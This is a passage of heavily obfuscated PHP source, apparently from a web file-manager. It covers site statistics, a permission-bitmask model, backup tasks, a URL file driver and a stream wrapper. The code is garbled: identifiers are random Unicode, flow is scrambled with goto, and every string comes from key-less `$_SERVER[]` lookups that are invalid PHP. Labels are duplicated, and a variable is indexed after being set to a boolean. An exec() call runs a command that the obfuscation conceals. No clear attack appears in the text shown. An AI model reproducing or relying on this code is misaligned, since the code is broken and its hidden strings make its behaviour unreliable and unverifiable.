Model($FõÂ)->min($c[183]); } $Bɟ = $c[2004] . ucfirst($fۯƴ); $f = $this->dateList($C؇); goto fǻ; b: } private function dateList($fג) { $e㥒 =& $_SERVER[]; $cͶმ = $fג; $c = strtotime($e㥒[2003]); $E쫇 = array(); while ($cͶმ <= $c) { $E쫇[] = date($e㥒[2002], $cͶმ); $cͶმ = strtotime($e㥒[2005], $cͶმ); } return $E쫇; } public function _recordUser($eՊ = '') { goto Fܥ; d̡: $a = array($F[206] => $eՊ, $F[686] => (int) $c, $F[1995] => (int) $b䷑, $F[1996] => (int) $Fᝠ); return $this->insert($a); goto a빾; Fܥ: $F =& $_SERVER[]; $bň = strtotime(date($F[2006], strtotime($eՊ))); $eڕ = strtotime(date($F[2007], strtotime($eՊ))); goto e˧; A: $b䷑ = Model($F[473])->where($Dӡ)->count($F[1406]); $Dӡ[$F[29]] = $F[2008]; $Fᝠ = Model($F[2009])->where($Dӡ)->count($F[2010]); goto d̡; e˧: $Dӡ = array($F[183] => array($F[913], $eڕ)); $c = Model($F[473])->where($Dӡ)->count($F[1406]); $Dӡ[$F[183]] = array($F[317], array($bň, $eڕ)); goto A; a빾: } public function _recordStore($Dē = '') { goto BÙ; A蚄ܤ: $a = Model($B[418])->where($c君)->sum($B[77]); $c君[$B[366]] = 0; $e = Model($B[738])->where($c君)->sum($B[77]); goto Bؗ; Bؗ: $c君[$B[367]] = 1; $dك = Model($B[738])->where($c君)->sum($B[77]); $c君[$B[367]] = 2; goto FِϤ; FِϤ: $aߐ = Model($B[738])->where($c君)->sum($B[77]); $e = array($B[206] => $Dē, $B[684] => (int) $e, $B[1999] => (int) $a, $B[2000] => (int) $dك, $B[2001] => (int) $aߐ); return $this->insert($e); goto e٪; BÙ: $B =& $_SERVER[]; $C͙ = strtotime(date($B[2007], strtotime($Dē))); $c君 = array($B[183] => array($B[913], $C͙)); goto A蚄ܤ; e٪: } public function trend($c, $b) { goto a؂; a؂: $F柲؜ =& $_SERVER[]; if (!$this->init($c)) { return !1; } $Eé = $this->trendList($c); goto c; c: if ($Eé && $b != $F柲؜[1381]) { $B݇ = $Eé[0][$F柲؜[206]]; $c = $this->validDate($b, $B݇); $A = array(); $F˃ = array_to_keyvalue($Eé, $F柲؜[206]); foreach ($c as $C߱) { if (isset($F˃[$C߱])) { $a = $F˃[$C߱]; } else { $a = end($Eé); $a[$F柲؜[206]] = $C߱; if ($c == $F柲؜[531]) { $a[$F柲؜[1995]] = $a[$F柲؜[1996]] = 0; } } $A[] = $a; } $Eé = $A; } $e여 = array($F柲؜[531] => array($F柲؜[686] => LNG($F柲؜[2011]), $F柲؜[1995] => LNG($F柲؜[2012]), $F柲؜[1996] => LNG($F柲؜[2013])), $F柲؜[1997] => array($F柲؜[684] => LNG($F柲؜[2014]), $F柲؜[1999] => LNG($F柲؜[2015]), $F柲؜[2000] => LNG($F柲؜[2016]), $F柲؜[2001] => LNG($F柲؜[2017]))); $fޗґ = array($F柲؜[531] => $F柲؜[2018], $F柲؜[1997] => $F柲؜[77]); goto c͚; C: return $Eûݻ; goto F誌; c͚: if (empty($Eé)) { $C߱ = date($F柲؜[2002], strtotime($F柲؜[2003])); $C = array($F柲؜[206] => $C߱); foreach ($e여[$c] as $F => $dەְ) { $C[$F] = 0; } $Eé[] = $C; } $Eûݻ = array(); foreach ($Eé as $dەְ) { if ($c == $F柲؜[1997] && $dەְ[$F柲؜[1999]] > $dەְ[$F柲؜[684]]) { $dەְ[$F柲؜[1999]] = $dەְ[$F柲؜[684]]; } foreach ($e여[$c] as $F => $F񛎶۷) { $a = array($F柲؜[206] => $dەְ[$F柲؜[206]], $F柲؜[1313] => $F񛎶۷); $a[$fޗґ[$c]] = isset($dەְ[$F]) ? $dەְ[$F] : 0; $Eûݻ[] = $a; } } goto C; F誌: } public function validDate($f׋, $b˯߰) { goto fϿ; fϿ: $A蹒 =& $_SERVER[]; $E = date($A蹒[2002], strtotime($A蹒[2003])); $e̍ = array($E); goto Bߍ; EŶٝ: return $e̍; goto Eԡƕ; Bߍ: switch ($f׋) { case $A蹒[1388]: $aԺ = mktime(0, 0, 0, date($A蹒[2019]), date($A蹒[2020]) - date($A蹒[1205]) + 7 - 7, date($A蹒[2021])); $e = 0; do { $A = date($A蹒[2002], $aԺ - 3600 * 24 * 7 * $e); $e̍[] = $A; $e++; } while ($b˯߰ < $A); break; case $A蹒[1386]: $e = 1; do { $a = date($A蹒[2022], strtotime("\55\x20{$e}\40\x6d\157\x6e\164\150\163")); $e̍[] = $a; $e++; } while ($b˯߰ < $a); break; case $A蹒[1690]: $aܥ = (int) date($A蹒[2021], strtotime($b˯߰)); $fЂ = (int) date($A蹒[2021]); if ($aܥ >= $fЂ) { break; } for ($aܥ; $aܥ < $fЂ; $aܥ++) { $e̍[] = $aܥ . $A蹒[2023]; } break; default: break; } if ($b˯߰ > end($e̍)) { array_pop($e̍); } sort($e̍); goto EŶٝ; Eԡƕ: } public function listTable($b۬) { $fйӈ = ucfirst($b۬); return Model($fйӈ)->listData(); } public function option($E) { $d̰љ = $_SERVER[][2024] . ucfirst($E); return $this->{$d̰љ}(); } private function optionUser() { goto bĮ; b: $fڤ = strtotime($f仾[2026]); $e¹ = array($f仾[2027] => array($f仾[914], $fڤ)); $Aۊ = (int) Model($f仾[473])->where($e¹)->count($f仾[1406]); goto BϾ; BϾ: if (!$Aۊ) { $Aۊ = 1; } $fڤ = strtotime(date($f仾[2006])); $e¹ = array($f仾[2027] => array($f仾[914], $fڤ)); goto a; a: $Eإ = Model($f仾[473])->where($e¹)->count($f仾[1406]); return array($f仾[681] => (int) $bە, $f仾[2028] => (int) ($bە - $E߼), $f仾[2029] => (int) $E߼, $f仾[2030] => (int) $Eإ, $f仾[2031] => $Aۊ); goto bѱӼƎ; bĮ: $f仾 =& $_SERVER[]; $bە = Model($f仾[473])->count($f仾[1406]); $E߼ = Model($f仾[473])->where($f仾[2025])->count($f仾[1406]); goto b; bѱӼƎ: } private function optionFile() { goto b₠; F: $b = $f[$C򆃝ウ[1999]]; $CڳѰ = Model($C򆃝ウ[738])->where(array($C򆃝ウ[366] => 0))->count($C򆃝ウ[365]); $Aۼ = array($C򆃝ウ[366] => 0, $C򆃝ウ[183] => array($C򆃝ウ[914], strtotime(date($C򆃝ウ[2006])))); goto E; b₠: $C򆃝ウ =& $_SERVER[]; $f = $this->sourceSize(); $d = $f[$C򆃝ウ[77]]; goto F; E: $cϻ = Model($C򆃝ウ[738])->where($Aۼ)->sum($C򆃝ウ[77]); $a = Model($C򆃝ウ[738])->where($Aۼ)->count($C򆃝ウ[365]); return array($C򆃝ウ[684] => $d, $C򆃝ウ[1999] => $b, $C򆃝ウ[2032] => $d - $b, $C򆃝ウ[2033] => (int) $cϻ, $C򆃝ウ[686] => (int) $CڳѰ, $C򆃝ウ[2034] => (int) $a); goto Eũݎ; Eũݎ: } private function optionAccess() { $Aǰ =& $_SERVER[]; return array($Aǰ[681] => $this->typeLogCnt(), $Aǰ[102] => $this->typeLogCnt($Aǰ[102]), $Aǰ[400] => $this->typeLogCnt($Aǰ[400]), $Aǰ[2035] => $this->typeLogCnt($Aǰ[2035]), $Aǰ[2036] => $this->typeLogCnt($Aǰ[2036]), $Aǰ[531] => $this->typeLogCnt($Aǰ[33], $Aǰ[2010])); } private function typeLogCnt($bȂɶ = '', $C = "\x69\x64") { goto Eݯ; e׃: return (int) $bÌ; goto Aͷ; c򅩍: $E⽦ = array($cХݓ[183] => array($cХݓ[914], $ḛ˲)); if ($bȂɶ) { $E⽦[$cХݓ[29]] = array($cХݓ[7], $C愫[$bȂɶ]); } $bÌ = Model($cХݓ[2009])->where($E⽦)->count($C); goto e׃; Eݯ: $cХݓ =& $_SERVER[]; $C愫 = array($cХݓ[102] => array($cХݓ[2037], $cХݓ[2038]), $cХݓ[400] => array($cХݓ[2039], $cХݓ[2040]), $cХݓ[2035] => array($cХݓ[2041], $cХݓ[2042]), $cХݓ[2036] => array($cХݓ[2043], $cХݓ[2044]), $cХݓ[2045] => array($cХݓ[2046], $cХݓ[2047], $cХݓ[2048])); $ḛ˲ = strtotime(date($cХݓ[2006])); goto c򅩍; Aͷ: } private function optionServer() { goto D͎; e: if ($d == $B䟇҉[710]) { $a = explode($B䟇҉[1063], $Bĉ[$B䟇҉[873]]); $d = $a[0]; } if ($d == $B䟇҉[713] || $d == $B䟇҉[714]) { $F롲 = Model()->db()->query($B䟇҉[2049]); $f餞 = $F롲[0] && isset($F롲[0][$B䟇҉[1312]]) ? $F롲[0][$B䟇҉[1312]] : 0; $d = $B䟇҉[2050] . ($f餞 ? $B䟇҉[8] . $f餞 : $B䟇҉[33]); } $Aғ = $GLOBALS[$B䟇҉[6]][$B䟇҉[333]][$B䟇҉[739]]; goto Eӆ; Eӆ: return array($B䟇҉[2051] => $cŤ ? $cŤ[$B䟇҉[2052]] : 0, $B䟇҉[2053] => $cŤ ? $cŤ[$B䟇҉[2054]] : 0, $B䟇҉[2055] => (int) $d仃[$B䟇҉[2052]] * 1024 * 1024 * 1024, $B䟇҉[2056] => (int) $Aڄ, $B䟇҉[2057] => ucfirst($Fά), $B䟇҉[2058] => $B䟇҉[2059] . PHP_VERSION, $B䟇҉[2060] => phpBuild64() ? 64 : 32, $B䟇҉[680] => str_replace($B䟇҉[2061], $B䟇҉[890], $d), $B䟇҉[333] => ucfirst($Aғ), $B䟇҉[28] => $_SERVER[$B䟇҉[2062]]); goto CҶ; a׽̓: $b = array($B䟇҉[729] => $d仃[$B䟇҉[363]]); $Aڄ = Model($B䟇҉[418])->where($b)->sum($B䟇҉[77]); $D = explode($B䟇҉[50], $_SERVER[$B䟇҉[137]]); goto A; A: $Fά = $D[0]; $Bĉ = $GLOBALS[$B䟇҉[6]][$B䟇҉[17]]; $d = $Bĉ[$B䟇҉[874]]; goto e; D͎: $B䟇҉ =& $_SERVER[]; $cŤ = $this->diskDriver(); $d仃 = KodIO::defaultDriver(); goto a׽̓; CҶ: } private function diskDriver() { goto b; eՍ: $e = $Eߍ - @disk_free_space($C͈); return array($B[2052] => $Eߍ, $B[2054] => $e); goto b; b: $B =& $_SERVER[]; $C͈ = $B[8]; $B = $GLOBALS[$B[6]][$B[2063]] == $B[2064]; goto e; e: if ($B) { $C͈ = $B[2065]; if (function_exists($B[2066])) { exec($B[2067], $E); $C͈ = $E[1] . $B[8]; } } if (!file_exists($C͈)) { return; } $Eߍ = @disk_total_space($C͈); goto eՍ; b: } public function fileChart($f۹ę) { goto e왷; e왷: $fҭ =& $_SERVER[]; if (isset($f۹ę[$fҭ[1406]])) { return Model($fҭ[738])->userFileTypeProfile($f۹ę[$fҭ[1406]]); } if (isset($f۹ę[$fҭ[2068]])) { return Model($fҭ[738])->groupFileTypeProfile($f۹ę[$fҭ[2068]]); } goto Dؙ; Dؙ: $f⼒ = $this->sourceSize(); $a = array($fҭ[457] => 0, $fҭ[367] => 1); $FԬ = Model($fҭ[738])->where($a)->sum($fҭ[77]); goto aʹ͈; aʹ͈: $a[$fҭ[367]] = 2; $Fܫ = Model($fҭ[738])->where($a)->sum($fҭ[77]); return array($fҭ[684] => $f⼒[$fҭ[77]], $fҭ[1999] => $f⼒[$fҭ[1999]], $fҭ[2000] => (int) $FԬ, $fҭ[2001] => (int) $Fܫ); goto D鑋; D鑋: } private function sourceSize() { $F崢 =& $_SERVER[]; $Eލ쎳 = Model($F崢[738])->where(array($F崢[366] => 0))->sum($F崢[77]); $dت = Model($F崢[418])->sum($F崢[77]); if ($dت > $Eލ쎳) { $dت = $Eލ쎳; } return array($F崢[77] => (int) $Eލ쎳, $F崢[1999] => (int) $dت); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $Cئ穤 =& $_SERVER[]; $Dڌ = array(array($Cئ穤[382] => LNG($Cئ穤[2069]), $Cئ穤[2070] => $Cئ穤[2071], $Cئ穤[2072] => 6, $Cئ穤[2073] => 1, $Cئ穤[2074] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Cئ穤[382] => LNG($Cئ穤[2075]), $Cئ穤[2070] => $Cئ穤[2076], $Cئ穤[2072] => 1, $Cئ穤[2073] => 1, $Cئ穤[2074] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Cئ穤[382] => LNG($Cئ穤[2077]), $Cئ穤[2070] => $Cئ穤[2078], $Cئ穤[2072] => 2, $Cئ穤[2073] => 1, $Cئ穤[2074] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Cئ穤[382] => LNG($Cئ穤[2079]), $Cئ穤[2070] => $Cئ穤[2078], $Cئ穤[2072] => 3, $Cئ穤[2073] => 1, $Cئ穤[2074] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Cئ穤[382] => LNG($Cئ穤[2080]), $Cئ穤[2070] => $Cئ穤[2081], $Cئ穤[2072] => 4, $Cئ穤[2073] => 1, $Cئ穤[2074] => self::AUTH_SHOW | self::AUTH_VIEW), array($Cئ穤[382] => LNG($Cئ穤[2082]), $Cئ穤[2070] => $Cئ穤[2083], $Cئ穤[2072] => 5, $Cئ穤[2073] => 1, $Cئ穤[2074] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Cئ穤[382] => LNG($Cئ穤[2084]), $Cئ穤[2070] => $Cئ穤[2085], $Cئ穤[2072] => 7, $Cئ穤[2073] => 1, $Cئ穤[2074] => 0)); return $Dڌ; } public static function authCheck($E, $bʃЯ) { $E = intval($E); if (_get($GLOBALS, $_SERVER[][453])) { return !0; } if ($E <= 0) { return !1; } if (($E & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($E & $bʃЯ); } public static function authCheckShow($Dͻ) { return self::authCheck($Dͻ, self::AUTH_SHOW); } public static function authCheckView($f) { return self::authCheck($f, self::AUTH_VIEW); } public static function authCheckDownload($a搗) { return self::authCheck($a搗, self::AUTH_DOWNLOAD); } public static function authCheckUpload($CŃ) { return self::authCheck($CŃ, self::AUTH_UPLOAD); } public static function authCheckEdit($F) { return self::authCheck($F, self::AUTH_EDIT); } public static function authCheckRemove($c) { return self::authCheck($c, self::AUTH_REMOVE); } public static function authCheckShare($a) { return self::authCheck($a, self::AUTH_SHARE); } public static function authCheckComment($Cňޤ) { return self::authCheck($Cňޤ, self::AUTH_COMMENT); } public static function authCheckEvent($cĩ) { return self::authCheck($cĩ, self::AUTH_EVENT); } public static function authCheckRoot($a) { return self::authCheck($a, self::AUTH_ROOT); } public static function authDisable($FΠՆ, $D͐) { if (intval($FΠՆ) <= 0) { return 0; } return intval($FΠՆ) & ~$D͐; } public $optionType = "\123\171\163\164\145\x6d\x2e\x73\157\x75\162\x63\x65\x41\165\164\x68\114\x69\163\164"; public $field = array("\x6e\x61\x6d\x65", "\x61\x75\x74\x68", "\x6c\x61\142\x65\x6c", "\144\x69\x73\x70\154\x61\171", "\x73\171\x73\164\x65\x6d", "\x73\157\x72\x74"); public function initData() { $AԠ◉ = $this->authDefault(); foreach ($AԠ◉ as $A֟) { $this->add($A֟); } } public function listData($bݯ = false, $A˒ = "\x73\x6f\162\x74", $DуΔ = false) { return parent::listData($bݯ, $A˒, $DуΔ); } public function update($b饎, $d) { $e =& $_SERVER[]; $Dհё = parent::listData($b饎); $Eӆܓ = $this->findByName($d[$e[28]]); if (!$Dհё || $Eӆܓ && $Eӆܓ[$e[363]] != $Dհё[$e[363]]) { return !1; } $this->filterAuth($d[$e[372]]); return parent::update($b饎, $d); } public function remove($f) { $a = parent::listData($f); if (!$a || $a[$_SERVER[][1067]]) { return !1; } return parent::remove($f); } public function add($cѴ▋ = array()) { goto dٖ; dٖ: $cܤ =& $_SERVER[]; if ($this->findByName($cѴ▋[$cܤ[28]])) { return !1; } $eЇ = array($cܤ[28] => $cܤ[33], $cܤ[372] => 1, $cܤ[2086] => $cܤ[2087], $cܤ[2088] => 1, $cܤ[1067] => 0, $cܤ[2089] => 0); goto a͏т; e: return parent::insert($cѴ▋); goto b; a͏т: $cѴ▋ = array_merge($eЇ, $cѴ▋); $cѴ▋[$cܤ[2089]] = $this->getSort(); $this->filterAuth($cѴ▋[$cܤ[372]]); goto e; b: } private function getSort() { $B =& $_SERVER[]; $bիŜ = parent::listData(); $fѪ = array_to_keyvalue($bիŜ, $B[33], $B[2089]); return empty($fѪ) ? 0 : max($fѪ) + 1; } private function filterAuth(&$E) { goto E; E: if (!$E) { return; } $bկ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Fؿ = array(); goto Aޏ; Aޏ: foreach ($bկ as $E) { if ($E & $E) { $Fؿ[] = $E; } } if (in_array(self::AUTH_ROOT, $Fؿ)) { $E = array_sum($bկ); return; } $cŚ䩞 = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto F֋; F֋: foreach ($Fؿ as $E) { if (isset($cŚ䩞[$E])) { $Fؿ = array_merge($Fؿ, $cŚ䩞[$E]); } } $Fؿ[] = self::AUTH_SHOW; $E = array_sum(array_unique($Fؿ)); goto E֘; E֘: } public function sort($eꖅ, $Bļ칝) { return parent::update($eꖅ, $Bļ칝); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\56\x62\x61\x63\153\x75\x70\x4c\x69\163\164"; public $field = array("\x69\157", "\156\141\x6d\145", "\x73\164\141\164\x75\163", "\143\x6f\156\x74\145\x6e\x74", "\162\145\x73\165\154\x74", "\164\151\155\x65\x46\x72\157\155", "\164\151\155\145\x54\157"); public function config() { goto e; aꩦ: $D׺Ԍ = is_array($D׺Ԍ) ? $D׺Ԍ : array(); if (!isset($D׺Ԍ[$fد[678]])) { $D׺Ԍ[$fد[678]] = $fد[464]; } $a֏ = array(); goto fԐ; fԐ: Action($fد[2090])->taskInit(); $f = Model($fد[2091])->listData(); foreach ($f as $C͑) { if ($C͑[$fد[1067]] == $fد[83] && $C͑[$fد[1394]] == $fد[2092]) { $a֏ = $C͑; break; } } goto bё; bё: if (isset($a֏[$fد[186]])) { $a֏[$fد[186]] = json_decode($a֏[$fد[186]], !0); } if (isset($D׺Ԍ[$fد[186]])) { $a֏[$fد[186]][$fد[1381]] = $D׺Ԍ[$fد[186]]; unset($D׺Ԍ[$fد[186]]); } return array_merge($a֏, $D׺Ԍ); goto F; e: $fد =& $_SERVER[]; $D׺Ԍ = Model($fد[1075])->get($fد[698]); $D׺Ԍ = json_decode($D׺Ԍ, !0); goto aꩦ; F: } public function listData($E = false, $d = "\155\157\144\151\x66\x79\124\x69\x6d\x65", $d͜ = false) { return parent::listData($E, $d, !0); } public function lastItem() { $C̸ = $this->listData(); return !empty($C̸[0]) ? $C̸[0] : null; } public function kill($DɆ) { goto f; dՙÂ: return $this->remove($DɆ); goto Aӹޟ; d: Task::kill($CŰƆ[697]); Task::kill($CŰƆ[715]); Task::kill($CŰƆ[722]); goto EѴ; f: $CŰƆ =& $_SERVER[]; $Cȃ = $this->listData($DɆ); if (!$Cȃ || empty($Cȃ[$CŰƆ[28]])) { return !0; } goto d; EѴ: $Aݩ = $Cȃ[$CŰƆ[28]]; $bϳ = TEMP_FILES . $CŰƆ[696] . $Aݩ . $CŰƆ[8]; IO::remove($bϳ, !1); goto dՙÂ; Aӹޟ: } public function remove($DŶ׿) { $E = $this->listData($DŶ׿); if (!$E) { return !0; } return $this->backupRemove($E); } private function backupRemove($Bƫ) { $A꺞 =& $_SERVER[]; parent::remove($Bƫ[$A꺞[363]]); $BÈ = "\173\151\157\x3a{$Bƫ[$A꺞[677]]}\x7d\x2f\x64\x61\x74\141\142\x61\163\x65\x2f\142\141\x63\153\x75\160\137" . $Bƫ[$A꺞[28]]; IO::remove($BÈ, !1); return !0; } public function start() { goto a; f: if (!$A̽ȟ->dbFile()) { return !1; } if ($C[$a戩޴[678]] == $a戩޴[464]) { $A̽ȟ->file(); } Backup::set(array($a戩޴[675] => 1, $a戩޴[689] => time())); goto a; cق؉ڬ: $A̽ȟ = new Backup(); $A̽ȟ->keep(); if (!$A̽ȟ->db()) { return !1; } goto f; BЎ: if (!$C || $C[$a戩޴[1378]] != $a戩޴[83]) { return !1; } $Dϗɢ = $this->process(); foreach ($Dϗɢ as $Cʄ) { if ($Cʄ) { return Task::restart($Cʄ[$a戩޴[363]]); } } goto cق؉ڬ; a: return !0; goto DΤ; a: $a戩޴ =& $_SERVER[]; if ($GLOBALS[$a戩޴[6]][$a戩޴[84]][$a戩޴[2093]] != $a戩޴[83]) { return !0; } $C = $this->config(); goto BЎ; DΤ: } public function process() { $dĩ =& $_SERVER[]; return array($dĩ[680] => Task::get($dĩ[697]), $dĩ[683] => Task::get($dĩ[715]), $dĩ[163] => Task::get($dĩ[722])); } public function restore() { $F̓ւ =& $_SERVER[]; ActionCall($F̓ւ[2094], !0, 1); ActionCall($F̓ւ[2094], !0, 0); } } goto Fƹ; CƄ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Eײ = false) { } public function exist($eߦ) { $a = $this->info($eߦ); return $a[$_SERVER[][184]]; } public function isFile($a) { $b׌ = $this->info($a); return $b׌[$_SERVER[][184]]; } public function isFolder($eת) { return !1; } public function size($A®) { $fÚ = $this->info($A®); return $fÚ[$_SERVER[][77]]; } public function info($CԲ) { return $this->infoParse($CԲ); } public function infoAuth($E) { return $this->infoParse($E); } public function infoWithChildren($C) { return $this->infoParse($C); } public function infoFull($b) { return $this->infoParse($b); } private function infoParse($DҞش) { $fػ =& $_SERVER[]; $E = $this->header($DҞش); if (!$E || !$E[$fػ[675]]) { return !1; } $F = _get($E, $fػ[321], 0); $A阼 = array($fػ[28] => $E[$fػ[28]], $fػ[75] => $DҞش, $fػ[29] => $fػ[163], $fػ[77] => intval($F), $fػ[156] => get_path_ext($E[$fػ[28]]), $fػ[1141] => $F > 0 && $E[$fػ[1268]], $fػ[1142] => !1); return $A阼; } private function header($f) { if (isset(self::$_cacheHeader[$f])) { return self::$_cacheHeader[$f]; } self::$_cacheHeader[$f] = url_header($f); return self::$_cacheHeader[$f]; } public function hashSimple($b, $BڵЦ = false) { goto Eڎ; Eڎ: $CԨ =& $_SERVER[]; $Bֽڴ = $this->info($b); if (!$Bֽڴ || !$Bֽڴ[$CԨ[184]]) { return !1; } goto BỄ; Aˇ: if ($Eݾ <= $bͦʉ * $E) { return md5($this->fileSubstr($b, 0, $Eݾ)) . $Eݾ; } $Aƙ = intval($Eݾ / $E); $d = $CԨ[33]; goto d; BỄ: $Eݾ = $Bֽڴ[$CԨ[77]]; $bͦʉ = 200; $E = 50; goto Aˇ; d: $bꉏ = timeFloat(); $B׿ = 15; for ($Eۘ = 0; $Eۘ < $E; $Eۘ++) { if (timeFloat() - $bꉏ > $B׿) { return !1; } $dȊ͸ = $this->fileSubstr($b, $Aƙ * $Eۘ, $bͦʉ); if (!$dȊ͸) { return !1; } $d .= $dȊ͸; } goto aш; aш: $d .= $this->fileSubstr($b, $Eݾ - $bͦʉ, $bͦʉ); return md5($d) . $Eݾ; goto E; E: } public function getContent($fſ) { return $this->fileSubstr($fſ); } public function fileSubstr($Cƭ, $E長 = 0, $DচÇ = -1) { goto CɄ; CɄ: $F =& $_SERVER[]; $A獣 = $this->info($Cƭ); if (!$A獣 || !$A獣[$F[184]] && $A獣[$F[77]] > 1024 * 1024 * 10) { return !1; } goto bۊՄ; b¨: $A = url_request($Cƭ, $F[212], !1, $e, !1, !1, 1); return $A[$F[1021]] ? $A[$F[1021]] : $F[33]; goto dӵ; bۊՄ: if ($DচÇ === -1) { $DচÇ = $A獣[$F[77]]; } if ($DচÇ == 0) { return $F[33]; } $e = array($F[1269] . $E長 . $F[700] . ($E長 + $DচÇ - 1)); goto b¨; dӵ: } public function download($C堮, $Aړ) { Downloader::start($C堮, $Aړ); return $Aړ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Cʅ, $f搭깏 = '') { goto A; EȣҌ: return $this->info ? !0 : !1; goto B֤; Bʋ: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Cʅ])) { self::$_chunkBuffer[$Cʅ] = array(); } goto EȣҌ; A: $this->info = $this->info($Cʅ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[][75]]; goto Bʋ; B֤: } function stream_read($FΣͳ) { $f上 = $this->fileSubstr($this->pose, $FΣͳ); $this->pose += strlen($f上); return $f上; } public function stream_tell() { return $this->pose; } public function stream_seek($a, $Aؓ鋦) { $AƼ =& $_SERVER[]; if ($Aؓ鋦 == SEEK_SET) { $this->pose = $a; } else { if ($Aؓ鋦 == SEEK_CUR) { $this->pose += $a; } else { if ($Aؓ鋦 == SEEK_END) { $this->pose = $this->info[$AƼ[77]] + intval($a); } } } if ($a < 0) { $this->pose = $this->info[$AƼ[77]] + $a; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[][77]]; } public function stream_close() { return !0; } public function url_stat($D©, $B흅ڏ) { $Aس =& $_SERVER[]; $Fֆ = $this->info($D©); return array($Aس[1270] => 0, $Aس[1271] => 0, $Aس[12] => 32768 + 511, $Aس[1272] => 0, $Aس[1273] => 0, $Aس[1274] => 0, $Aس[1275] => 0, $Aس[77] => $Fֆ[$Aس[77]], $Aس[1276] => $Fֆ[$Aس[1147]], $Aس[1233] => $Fֆ[$Aس[106]], $Aس[1232] => $Fֆ[$Aس[183]], $Aس[1277] => 0, $Aس[1278] => 0); } static $fileInfo = array(); public function info($Eǻ) { $fʼ = $_SERVER[][1279]; if (isset(self::$fileInfo[$Eǻ])) { return self::$fileInfo[$Eǻ]; } if (substr($Eǻ, 0, strlen($fʼ)) != $fʼ) { return !1; } self::$fileInfo[$Eǻ] = IO::info(substr($Eǻ, strlen($fʼ))); return self::$fileInfo[$Eǻ]; } public static function read($c毡ߣ, $Bً, $b) { goto b; cס: $Bƣ = 8192; fseek($d, $Bً, SEEK_SET); $eԈ = $b[33]; goto AҘ; b: $b =& $_SERVER[]; $d = fopen($c毡ߣ, $b[1149]); if (!$d) { return $b[33]; } goto cס; AҘ: $a = 0; while ($a < $b) { $F֏ = min($Bƣ, $b - $a); $eԈ .= fread($d, $F֏); $a += $F֏; } fclose($d); goto C脅; C脅: return $eԈ; goto D; D: } public function fileSubstr($aǣɂ, $Fˬ) { goto Fᯫլ; B͊ƚ: $Dٽ = 64 * 1024; $c׺̿ =& self::$_chunkBuffer[$this->path]; if (!$c׺̿) { $c׺̿ = array(); } goto f藴; Cь暻ѧ: ksort($c׺̿); $fޒ = substr($Dˍ, $aǣɂ - $C߈, $Fˬ); return $fޒ; goto d; f藴: $c΋ = 0; $C瑩 = 0; $f̍ = $f[33]; goto cކ; Fᯫլ: $f =& $_SERVER[]; $dݱ洦 = $this->info[$f[77]]; $a = $aǣɂ; goto a; Cྎ: if ($aǣɂ + $Fˬ > $dݱ洦) { $Fˬ = $dݱ洦 - $aǣɂ; } if ($Fˬ <= 0) { return $f[33]; } if ($aǣɂ < 0 || $aǣɂ >= $dݱ洦 || $Fˬ <= 0 || $Fˬ > 1024 * 1024 * 5) { throw new Exception("\x69\157\106\x69\154\145\122\x65\x61\x64\x20\x65\x72\162\x6f\162\x21\x20\163\x74\141\x72\164\75{$aǣɂ}\73\154\x65\156\x67\x74\150\x3d{$Fˬ}\73\40\163\151\172\145\75{$dݱ洦}\73"); } goto B͊ƚ; cކ: foreach ($c׺̿ as $c΋ => $f̍) { $c΋ = intval($c΋); $C瑩 = $c΋ + strlen($f̍); if ($aǣɂ >= $C瑩) { continue; } if ($aǣɂ >= $c΋ && $aǣɂ + $Fˬ <= $C瑩) { return substr($f̍, $aǣɂ - $c΋, $Fˬ); } break; } if (count($c׺̿) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($f[1280], $f[1281] . count($c׺̿) . "\x3b\163\164\141\x72\164\x3d{$aǣɂ}\54\x6c\x65\156\x67\164\150\75{$Fˬ}\x3b\x70\x6f\x73\145\x3a{$c΋}\176{$C瑩}"); throw new Exception($f[1282]); } $C߈ = intval($aǣɂ / $Dٽ) * $Dٽ; goto A懠; A懠: $Eѩ܇ = ceil(($aǣɂ + $Fˬ) / $Dٽ) * $Dٽ - $C߈; $Dˍ = IO::fileSubstr($this->path, $C߈, $Eѩ܇); $c׺̿[$C߈ . $f[33]] = $Dˍ; goto Cь暻ѧ; a: $D綠 = $Fˬ; if ($aǣɂ < 0) { $aǣɂ = 